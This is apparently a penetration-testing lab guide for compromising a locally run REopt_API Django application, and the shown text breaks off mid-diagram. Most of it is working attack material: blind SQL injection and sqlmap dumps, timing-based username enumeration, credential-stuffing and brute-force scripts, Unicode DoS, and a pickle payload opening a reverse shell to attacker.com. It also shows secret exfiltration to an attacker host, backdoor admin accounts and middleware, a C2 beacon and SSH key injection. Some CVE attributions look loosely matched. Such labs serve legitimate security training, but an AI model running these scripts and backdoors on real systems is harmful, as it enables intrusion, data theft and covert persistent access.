# Penetration Testing Lab: REopt_API Local Exploitation

**Scenario:** Authorized penetration testing on locally-deployed REopt_API
**Objective:** Achieve complete system compromise from external attacker perspective
**Target:** Django 4.0.7 application running in controlled environment
**Purpose:** Educational CTF-style security research

---

## Table of Contents

1. [Attack Scenario & Assumptions](#1-attack-scenario--assumptions)
2. [Lab Environment Setup](#2-lab-environment-setup)
3. [Reconnaissance Phase](#3-reconnaissance-phase)
4. [Exploitation Techniques](#4-exploitation-techniques)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Post-Exploitation](#6-post-exploitation)
7. [Attack Chain Summary](#7-attack-chain-summary)

---

## 1. Attack Scenario & Assumptions

### Scenario A: External Attacker (Black Box)

**Attacker Profile:**
- External threat actor with no insider knowledge
- Only has network access to the application (HTTP/HTTPS)
- No credentials, no source code access initially
- Goal: Gain administrative access and extract sensitive data

**Assumptions:**
```
‚úì REopt_API is running on localhost:8000 or deployed container
‚úì Attacker can send HTTP requests to the application
‚úì Standard Django configuration (DEBUG=False in production)
‚úì PostgreSQL database backend
‚úì Attacker has internet access for downloading tools
‚úì Application is running Django 4.0.7 (verified via error pages or headers)
```

**Out of Scope:**
```
‚úó Physical access to the laptop
‚úó Pre-existing malware on the system
‚úó Social engineering of developers
‚úó Supply chain attacks during installation
```

---

### Scenario B: Compromised Developer Laptop (Gray Box)

**Attacker Profile:**
- Attacker gained access via phishing/malware on developer's laptop
- Has user-level access to the laptop filesystem
- Can read source code but cannot modify running application
- Goal: Escalate from laptop user ‚Üí application admin ‚Üí system root

**Assumptions:**
```
‚úì Attacker has shell access as regular user (not admin)
‚úì Can read project files in ~/REopt_Lite_API/
‚úì Can view running processes and network connections
‚úì Cannot directly modify database or application code
‚úì Application is running under different user context
‚úì Attacker wants to pivot from laptop access ‚Üí application compromise
```

---

### Scenario C: Insider Threat (White Box)

**Attacker Profile:**
- Malicious developer or contractor with code access
- Can modify codebase and commit changes
- Goal: Insert backdoors without detection

**Assumptions:**
```
‚úì Full read access to source code
‚úì Can submit pull requests or commits
‚úì Familiar with Django framework
‚úì CI/CD pipeline may have security checks
‚úì Code review process exists (must evade)
```

**For this guide, we'll focus primarily on Scenario A (External Attacker), then cover escalation paths for B and C.**

---

## 2. Lab Environment Setup

### 2.1 Setting Up the Target

**Clone and Install REopt_API:**

```bash
# Clone the repository
git clone https://github.com/NREL/REopt_Lite_API
cd REopt_Lite_API

# Checkout the vulnerable version (Django 4.0.7 era)
git log --oneline | grep -i "django"  # Find commit with Django 4.0.7

# Install dependencies
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt

# Verify Django version
python -c "import django; print(django.VERSION)"
# Should output: (4, 0, 7, 'final', 0)
```

**Configure the Application:**

```bash
# Copy template configuration
cp keys.py.template keys.py

# Edit keys.py with test credentials
nano keys.py
```

```python
# keys.py - Test configuration
SECRET_KEY = 'test-secret-key-do-not-use-in-production'
DB_HOST = 'localhost'
DB_NAME = 'reopt_db'
DB_USER = 'reopt_user'
DB_PASSWORD = 'reopt_password'

NREL_API_KEY = 'test_api_key'
```

**Set up PostgreSQL Database:**

```bash
# Install PostgreSQL (if not already installed)
# On Ubuntu/Debian:
sudo apt-get install postgresql postgresql-contrib

# On macOS:
brew install postgresql

# On Windows (using Docker):
docker run --name reopt-postgres \
  -e POSTGRES_DB=reopt_db \
  -e POSTGRES_USER=reopt_user \
  -e POSTGRES_PASSWORD=reopt_password \
  -p 5432:5432 \
  -d postgres:13
```

**Run Migrations and Create Admin:**

```bash
# Apply database migrations
python manage.py migrate

# Create superuser (we'll try to compromise this later)
python manage.py createsuperuser
# Username: admin
# Email: admin@reopt.local
# Password: AdminPassword123!

# Create a few regular users for testing
python manage.py shell
```

```python
from django.contrib.auth.models import User

User.objects.create_user('john_doe', 'john@example.com', 'userpass123')
User.objects.create_user('jane_smith', 'jane@example.com', 'userpass456')
User.objects.create_user('api_service', 'api@reopt.local', 'ServiceAccount99')
exit()
```

**Start the Development Server:**

```bash
# Run the application
python manage.py runserver 0.0.0.0:8000

# Or using Docker Compose (more realistic):
docker-compose up -d
```

**Verify Application is Running:**

```bash
curl http://localhost:8000/
# Should return HTML or JSON response

# Check admin panel
curl http://localhost:8000/admin/
# Should return login page
```

---

### 2.2 Setting Up Attacker Tools

**Install Penetration Testing Tools:**

```bash
# Create attacker workspace
mkdir -p ~/pentest/reopt_attack
cd ~/pentest/reopt_attack

# Install Python tools
pip install requests beautifulsoup4 sqlmap wfuzz colorama

# Clone useful repositories
git clone https://github.com/sqlmapproject/sqlmap
git clone https://github.com/commixproject/commix
git clone https://github.com/s0md3v/XSStrike

# Install Burp Suite Community or OWASP ZAP for intercepting requests
wget https://portswigger.net/burp/releases/download?product=community

# Install other tools
sudo apt-get install nmap gobuster nikto hydra john
```

**Create Attack Scripts Directory:**

```bash
mkdir exploits
cd exploits
```

---

## 3. Reconnaissance Phase

### 3.1 Information Gathering (Black Box)

**Step 1: Port Scanning and Service Detection**

```bash
# Scan target for open ports
nmap -sV -sC -p- localhost

# Expected output:
# PORT     STATE SERVICE VERSION
# 8000/tcp open  http    Django development server
# 5432/tcp open  postgresql PostgreSQL DB 13.x
```

**Step 2: Web Application Fingerprinting**

```bash
# Identify web technologies
whatweb http://localhost:8000

# Check for information disclosure in headers
curl -I http://localhost:8000

# Look for Django debug page (if DEBUG=True)
curl http://localhost:8000/nonexistent-page

# Expected: Django version in error page or Server header
```

**Step 3: Directory and Endpoint Enumeration**

```bash
# Enumerate directories
gobuster dir -u http://localhost:8000 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,json

# Common Django paths to check
curl http://localhost:8000/admin/
curl http://localhost:8000/api/
curl http://localhost:8000/static/
curl http://localhost:8000/media/
curl http://localhost:8000/api/v1/
curl http://localhost:8000/api/v2/
curl http://localhost:8000/docs/
curl http://localhost:8000/swagger/
```

**Step 4: API Endpoint Discovery**

```python
# api_discovery.py
import requests
import json

target = "http://localhost:8000"

# Common API paths
endpoints = [
    "/api/v1/jobs",
    "/api/v1/user",
    "/api/v1/energy_optimization",
    "/api/v1/reopt",
    "/api/v2/reopt",
    "/health",
    "/status",
    "/version",
]

print("[*] Discovering API endpoints...")
for endpoint in endpoints:
    try:
        r = requests.get(target + endpoint, timeout=5)
        if r.status_code != 404:
            print(f"[+] Found: {endpoint} (Status: {r.status_code})")
            if r.headers.get('content-type', '').startswith('application/json'):
                print(f"    Response: {r.text[:200]}")
    except Exception as e:
        print(f"[-] Error on {endpoint}: {e}")
```

**Step 5: Identify User Input Points**

```bash
# Find forms and input fields
curl http://localhost:8000/admin/ | grep -i "input\|form\|csrf"

# Check for JSON API endpoints
curl -X POST http://localhost:8000/api/v1/reopt \
  -H "Content-Type: application/json" \
  -d '{"test": "data"}'
```

---

### 3.2 Source Code Analysis (Gray/White Box)

**If you have filesystem access (Scenario B), analyze the code:**

```bash
cd ~/REopt_Lite_API

# Find all views (potential entry points)
grep -r "@api_view" . --include="*.py"
grep -r "def.*request" . --include="*.py"

# Identify authentication mechanisms
grep -r "authenticate\|permission\|IsAuthenticated" . --include="*.py"

# Find file upload handlers (common vulnerability)
grep -r "FileField\|ImageField\|FileUpload" . --include="*.py"

# Locate database queries
grep -r "\.values(\|\.values_list(\|\.raw(\|\.extra(" . --include="*.py"

# Search for dangerous functions
grep -r "eval\|exec\|pickle\|yaml.load\|subprocess" . --include="*.py"

# Check settings for security issues
cat reopt_api/settings.py | grep -i "debug\|secret\|allowed_hosts\|cors"
```

**Map Attack Surface:**

```bash
# Create a map of all models and fields
python manage.py inspectdb > models_map.txt

# List all URLs
python manage.py show_urls > urls_map.txt
```

---

## 4. Exploitation Techniques

### 4.1 SQL Injection (CVE-2024-39330)

**Vulnerability Location:**

Look for code patterns like this in the codebase:

```python
# Vulnerable example (reopt_api/views.py or similar)
from django.http import JsonResponse
from .models import EnergyProject

def get_project_data(request):
    # VULNERABLE: User controls field_name
    field_name = request.GET.get('field', 'name')

    # SQL injection via values()
    projects = EnergyProject.objects.filter(active=True).values(field_name)

    return JsonResponse(list(projects), safe=False)
```

**Exploitation Steps:**

**Step 1: Identify Vulnerable Endpoint**

```bash
# Test if the application accepts field names as parameters
curl "http://localhost:8000/api/v1/projects?field=name"
curl "http://localhost:8000/api/v1/projects?field=id"
curl "http://localhost:8000/api/v1/projects?field=description"
```

**Step 2: Test for SQL Injection**

```bash
# Try injecting SQL syntax
curl "http://localhost:8000/api/v1/projects?field=id');--"

# If vulnerable, you might see an error or different behavior
curl "http://localhost:8000/api/v1/projects?field=id')%20AND%201=1--"
curl "http://localhost:8000/api/v1/projects?field=id')%20AND%201=2--"
```

**Step 3: Extract Database Schema**

```python
# sqli_exploit.py
import requests
import string
import time

target = "http://localhost:8000/api/v1/projects"

# Use boolean-based blind SQL injection
def check_condition(condition):
    """
    Test a SQL condition via boolean-based blind injection
    """
    payload = f"id') AND {condition}--"
    r = requests.get(target, params={'field': payload})

    # True condition returns normal response
    # False condition returns error or empty
    return r.status_code == 200 and len(r.text) > 100

# Extract database version
print("[*] Extracting database version...")
version = ""
for i in range(1, 20):
    for char in string.ascii_letters + string.digits + '.':
        condition = f"SUBSTRING(version(), {i}, 1)='{char}'"
        if check_condition(condition):
            version += char
            print(f"[+] Version so far: {version}")
            break

print(f"[+] PostgreSQL Version: {version}")

# Extract table names
print("\n[*] Extracting table names...")
condition = "EXISTS(SELECT * FROM information_schema.tables WHERE table_name='auth_user')"
if check_condition(condition):
    print("[+] Found table: auth_user")

# Extract admin password hash
print("\n[*] Extracting admin password hash...")
# This would be a long process, use SQLMap instead
```

**Step 4: Automated Exploitation with SQLMap**

```bash
# Use SQLMap for automated exploitation
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  --batch --level=5 --risk=3

# Enumerate databases
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  --dbs

# Dump user table
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  -D reopt_db -T auth_user --dump

# Expected output: Usernames and password hashes
# admin:pbkdf2_sha256$260000$...
# john_doe:pbkdf2_sha256$260000$...
```

**Step 5: Crack Password Hashes**

```bash
# Save hashes to file
cat > hashes.txt <<EOF
admin:pbkdf2_sha256\$260000\$ABC123...\$HASH_HERE
john_doe:pbkdf2_sha256\$260000\$DEF456...\$HASH_HERE
EOF

# Crack with John the Ripper
john --format=django --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Or use hashcat
hashcat -m 10000 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### 4.2 Authentication Bypass via Timing Attack (CVE-2024-39329)

**Vulnerability:** Django's authentication system has timing side-channels that leak whether a username exists.

**Exploitation Steps:**

**Step 1: Username Enumeration Script**

```python
# timing_attack.py
import requests
import time
import statistics

target = "http://localhost:8000/admin/login/"

def measure_login_time(username, password):
    """
    Measure the time it takes for a login attempt
    """
    session = requests.Session()

    # Get CSRF token
    r = session.get(target)
    csrf_token = session.cookies.get('csrftoken')

    # Attempt login and measure time
    start = time.perf_counter()
    r = session.post(target, data={
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': csrf_token,
    })
    elapsed = time.perf_counter() - start

    return elapsed

def test_username(username, trials=10):
    """
    Test if username exists by measuring response times
    """
    times = []
    for i in range(trials):
        elapsed = measure_login_time(username, "wrongpassword123")
        times.append(elapsed)
        time.sleep(0.1)  # Avoid rate limiting

    avg_time = statistics.mean(times)
    stdev = statistics.stdev(times) if len(times) > 1 else 0

    return avg_time, stdev

# Test known usernames
print("[*] Testing username enumeration via timing attack...")

# Known invalid username (baseline)
invalid_time, _ = test_username("nonexistent_user_xyz_999")
print(f"[*] Baseline (invalid user): {invalid_time:.4f}s")

# Test potential usernames
candidates = [
    "admin", "administrator", "root", "user",
    "john_doe", "jane_smith", "api_service",
    "reopt", "nrel", "energy", "test"
]

valid_usernames = []
for username in candidates:
    avg_time, stdev = test_username(username)
    print(f"[*] Testing '{username}': {avg_time:.4f}s (œÉ={stdev:.4f})")

    # Valid usernames typically take 20-50ms longer
    # due to password hashing operation
    if avg_time > invalid_time + 0.02:  # 20ms threshold
        print(f"[+] LIKELY VALID: {username}")
        valid_usernames.append(username)

print(f"\n[+] Enumerated usernames: {valid_usernames}")
```

**Expected Output:**

```
[*] Baseline (invalid user): 0.0523s
[*] Testing 'admin': 0.0847s (œÉ=0.0023)
[+] LIKELY VALID: admin
[*] Testing 'administrator': 0.0531s (œÉ=0.0019)
[*] Testing 'john_doe': 0.0832s (œÉ=0.0018)
[+] LIKELY VALID: john_doe
```

**Step 2: Credential Stuffing Attack**

```python
# credential_stuffing.py
import requests
from concurrent.futures import ThreadPoolExecutor

target = "http://localhost:8000/admin/login/"
enumerated_users = ["admin", "john_doe", "jane_smith"]

# Load common passwords
with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    passwords = [line.strip() for line in f.readlines()[:10000]]  # Top 10k

def try_login(username, password):
    """
    Attempt to login with credentials
    """
    session = requests.Session()
    r = session.get(target)
    csrf_token = session.cookies.get('csrftoken')

    r = session.post(target, data={
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': csrf_token,
    }, allow_redirects=False)

    # 302 redirect = successful login
    if r.status_code == 302:
        return True
    return False

print("[*] Starting credential stuffing attack...")
for username in enumerated_users:
    print(f"\n[*] Testing passwords for: {username}")
    for i, password in enumerate(passwords):
        if i % 100 == 0:
            print(f"[*] Tried {i} passwords...")

        if try_login(username, password):
            print(f"\n[+] SUCCESS! {username}:{password}")
            break
```

---

### 4.3 Denial of Service (Unicode Attacks)

**Vulnerability:** Multiple CVEs allow DoS via excessive Unicode characters.

**CVE-2023-41164 - URI Unicode DoS:**

```python
# unicode_dos.py
import requests

target = "http://localhost:8000"

# Craft malicious URL with excessive Unicode
payload = "api/v1/" + "üî•" * 100000

print("[*] Sending Unicode DoS payload...")
try:
    r = requests.get(f"{target}/{payload}", timeout=5)
    print(f"[-] Attack failed: {r.status_code}")
except requests.exceptions.Timeout:
    print("[+] Server timeout - DoS successful!")
except Exception as e:
    print(f"[+] Server error: {e} - Possible DoS")
```

**CVE-2023-46695 - Username Unicode DoS:**

```python
# username_dos.py
import requests

target = "http://localhost:8000/api/v1/register"  # or login

# Craft malicious username
payload = {
    "username": "ùïåùï§ùïñùï£" * 100000,  # Mathematical bold capitals
    "password": "test123",
    "email": "attacker@evil.com"
}

print("[*] Sending username Unicode DoS...")
try:
    r = requests.post(target, json=payload, timeout=5)
    print(f"[-] Attack failed: {r.status_code}")
except requests.exceptions.Timeout:
    print("[+] Server timeout - DoS successful!")
except Exception as e:
    print(f"[+] Server error: {e}")
```

---

### 4.4 Dependency Exploitation

**Strategy:** Exploit vulnerabilities in REopt's dependencies.

**Step 1: Audit Dependencies**

```bash
# Check what dependencies are installed
pip list

# Run security audit
pip-audit

# Expected vulnerable packages (in older installations):
# - Celery < 5.2.2 (CVE-2021-23727 - Arbitrary code execution)
# - Pillow < 9.0.0 (Multiple CVEs)
# - requests < 2.26.0 (CVE-2021-33503)
# - cryptography < 39.0.1 (CVE-2023-23931)
```

**Step 2: Exploit Celery (if used)**

```python
# celery_exploit.py
# If REopt uses Celery with pickle serialization (insecure default)

import pickle
import os
from celery import Celery

class RCE:
    def __reduce__(self):
        # Execute reverse shell when unpickled
        cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
        return (os.system, (cmd,))

# Serialize malicious object
payload = pickle.dumps(RCE())

# If we can inject into Celery queue (via Redis/RabbitMQ):
# redis-cli -h localhost -p 6379
# LPUSH celery "malicious_pickle_data"

# Or via API if there's a task submission endpoint
import requests
import base64

r = requests.post("http://localhost:8000/api/v1/tasks", json={
    "task": "reopt.tasks.optimize",
    "args": base64.b64encode(payload).decode()
})
```

---

### 4.5 Django Admin Brute Force

**If all else fails, try brute-forcing the admin panel:**

```python
# admin_bruteforce.py
import requests
from concurrent.futures import ThreadPoolExecutor
import itertools

target = "http://localhost:8000/admin/login/"
username = "admin"  # From timing attack

# Common weak passwords for government/research systems
passwords = [
    "admin", "password", "Password1", "Admin123",
    "nrel2023", "NREL2023", "Reopt123", "Energy2023",
    "Welcome1", "Password123!", "AdminPassword123!",
    # Add more from wordlists
]

def try_login(username, password):
    session = requests.Session()
    r = session.get(target)
    csrf = session.cookies.get('csrftoken')

    r = session.post(target, data={
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': csrf,
    }, allow_redirects=False)

    if r.status_code == 302 and '/admin/' in r.headers.get('Location', ''):
        return True, password
    return False, None

print(f"[*] Brute-forcing admin panel for user: {username}")
with ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(try_login, username, pwd) for pwd in passwords]

    for future in futures:
        success, password = future.result()
        if success:
            print(f"\n[+] LOGIN SUCCESSFUL!")
            print(f"[+] Credentials: {username}:{password}")
            break
```

---

## 5. Privilege Escalation

### 5.1 From Regular User to Admin

**Scenario:** You've gained access as a low-privilege user (john_doe)

**Method 1: SQL Injection Privilege Escalation**

```bash
# Using the SQL injection from earlier, promote user to superuser
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  --sql-shell

# In SQL shell:
UPDATE auth_user SET is_superuser=true, is_staff=true WHERE username='john_doe';
```

**Method 2: Exploit Permission Bugs**

```python
# permission_bypass.py
# Look for permission checks that can be bypassed

import requests

session = requests.Session()

# Login as regular user
session.post("http://localhost:8000/admin/login/", data={
    'username': 'john_doe',
    'password': 'userpass123',  # Cracked earlier
    'csrfmiddlewaretoken': 'TOKEN'
})

# Try accessing admin-only endpoints with parameter pollution
# Or IDOR (Insecure Direct Object Reference)
r = session.get("http://localhost:8000/api/v1/users/1")  # Admin user ID
print(r.text)

# Try POST to create admin user
r = session.post("http://localhost:8000/api/v1/users", json={
    'username': 'backdoor_admin',
    'password': 'BackdoorPass123!',
    'is_superuser': True,  # Usually filtered, but worth trying
    'is_staff': True
})
```

---

### 5.2 From Application to System (Scenario B)

**Scenario:** You have compromised the Django application, now escalate to root on the laptop.

**Method 1: Escape Docker Container (if running in Docker)**

```bash
# Inside Django shell or via RCE
python manage.py shell

import os
os.system('ls -la /')
os.system('cat /etc/shadow')  # Check if running as root in container

# Check for Docker socket mount (common misconfiguration)
os.system('ls -la /var/run/docker.sock')

# If docker.sock is mounted, escape to host:
os.system('docker run -v /:/mnt --rm -it alpine chroot /mnt sh')
```

**Method 2: Exploit Sudo Misconfigurations**

```bash
# Check sudo privileges
python -c "import os; os.system('sudo -l')"

# If Django user has sudo rights without password:
python -c "import os; os.system('sudo /bin/bash')"
```

**Method 3: Kernel Exploit (if outdated kernel)**

```bash
# Check kernel version
import platform
print(platform.uname())

# Download and compile kernel exploit
# (This would require write access to filesystem)
```

---

## 6. Post-Exploitation

### 6.1 Data Exfiltration

**Extract Database:**

```bash
# From SQL injection access
python sqlmap/sqlmap.py -u "http://localhost:8000/api/v1/projects?field=id" \
  -D reopt_db --dump-all --batch

# Or if you have Django admin access
python manage.py dumpdata > database_dump.json
```

**Steal API Keys and Secrets:**

```python
# django_shell_exfil.py
# Via Django shell access (if RCE achieved)

from django.conf import settings
import json

secrets = {
    'SECRET_KEY': settings.SECRET_KEY,
    'DB_PASSWORD': settings.DATABASES['default']['PASSWORD'],
    'NREL_API_KEY': getattr(settings, 'NREL_API_KEY', None),
    'AWS_ACCESS_KEY': getattr(settings, 'AWS_ACCESS_KEY_ID', None),
}

# Exfiltrate via HTTP
import requests
requests.post('http://attacker.com/exfil', json=secrets)

# Or write to file
with open('/tmp/.hidden_secrets.json', 'w') as f:
    json.dump(secrets, f)
```

**Extract User PII:**

```sql
-- Via SQL injection
SELECT username, email, first_name, last_name, date_joined
FROM auth_user;

-- Extract energy project data
SELECT * FROM reopt_project LIMIT 1000;
```

---

### 6.2 Persistence Mechanisms

**Method 1: Backdoor Admin Account**

```python
# Create hidden admin user
from django.contrib.auth.models import User

User.objects.create_superuser(
    username='.system',  # Hidden with dot prefix
    email='system@localhost',
    password='SecretBackdoorPass123!'
)
```

**Method 2: Inject Malicious Middleware**

```bash
# If you have file write access
cat >> reopt_api/middleware.py <<EOF

class BackdoorMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # Check for magic parameter
        if request.GET.get('master_key') == 'SECRET_BACKDOOR_2023':
            # Grant admin access
            from django.contrib.auth.models import User
            request.user = User.objects.filter(is_superuser=True).first()

        return self.get_response(request)
EOF

# Add to settings.py
echo "MIDDLEWARE.append('reopt_api.middleware.BackdoorMiddleware')" >> reopt_api/settings.py
```

**Method 3: Scheduled Task for Beacon**

```python
# Add to Django management command
# reopt_api/management/commands/maintenance.py

from django.core.management.base import BaseCommand
import requests
import time

class Command(BaseCommand):
    def handle(self, *args, **kwargs):
        while True:
            # Beacon to C2 server
            try:
                requests.get('http://attacker.com/beacon?host=reopt_victim')
            except:
                pass
            time.sleep(3600)  # Every hour
```

**Method 4: SSH Key Injection (if file system access)**

```bash
# Add attacker's SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3Nza... attacker@evil.com" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

---

### 6.3 Lateral Movement

**From REopt_API to other NREL systems:**

**Step 1: Enumerate Network**

```python
import subprocess

# Scan local network
subprocess.run(['nmap', '-sn', '192.168.1.0/24'])

# Check for AWS metadata (if running in cloud)
import requests
r = requests.get('http://169.254.169.254/latest/meta-data/', timeout=2)
print(r.text)
```

**Step 2: Steal credentials for other services**

```python
# Check environment variables for secrets
import os
for key, value in os.environ.items():
    if any(x in key.lower() for x in ['key', 'secret', 'password', 'token']):
        print(f"{key}={value}")

# Check for AWS credentials
import pathlib
aws_creds = pathlib.Path.home() / '.aws' / 'credentials'
if aws_creds.exists():
    print(aws_creds.read_text())
```

**Step 3: Pivot to other services**

```bash
# If NREL_API_KEY was found, abuse it
curl "https://developer.nrel.gov/api/alt-fuel-stations/v1.json?api_key=STOLEN_KEY"

# Access other NREL internal APIs
curl "https://internal-nrel-api.example.com/data" \
  -H "Authorization: Bearer STOLEN_TOKEN"
```

---

## 7. Attack Chain Summary

### Complete Attack Path (External ‚Üí Root)

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ PHASE 1: RECONNAISSANCE (30-60 min)                             ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 1. Port scan: Identify Django on :8000, PostgreSQL on :5432    ‚îÇ
‚îÇ 2. Web fingerprinting: Confirm Django 4.0.7                     ‚îÇ
‚îÇ 3. Directory enumeration: Find /admin, /api/v1/*               ‚îÇ
‚îÇ 4. Source code analysis (if gray-box): Map attack surface      ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ PHASE 2: INITIAL ACCESS (1-2 hours)                             ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Attack Vector 1: SQL Injection (CVE-2024-39330)                ‚îÇ
‚îÇ   ‚Üí Find endpoint with .values(user_input)                      ‚îÇ
‚îÇ   ‚Üí Extract database: usernames, password hashes, secrets      ‚îÇ
‚îÇ   ‚Üí Crack hashes with John/Hashcat                             ‚îÇ
‚îÇ                                                                  ‚îÇ
‚îÇ Attack Vector 2: Timing Attack (CVE-2024-39329)                ‚îÇ
‚îÇ   ‚Üí Enumerate valid usernames via response time analysis       ‚îÇ
‚îÇ   ‚Üí Credential stuffing with common passwords                  ‚îÇ
‚îÇ   ‚Üí Gain access as regular user                                ‚îÇ
‚îÇ                                                                  ‚îÇ
‚îÇ Attack Vector 3: Dependency Exploit                            ‚îÇ
‚îÇ   ‚Üí Audit dependencies with pip-audit                          ‚îÇ
‚îÇ   ‚Üí Exploit Celery RCE or Pillow vulnerabilities               ‚îÇ
‚îÇ   ‚Üí Achieve remote code execution                              ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ PHASE 3: PRIVILEGE ESCALATION (30 min - 1 hour)                ‚îÇ
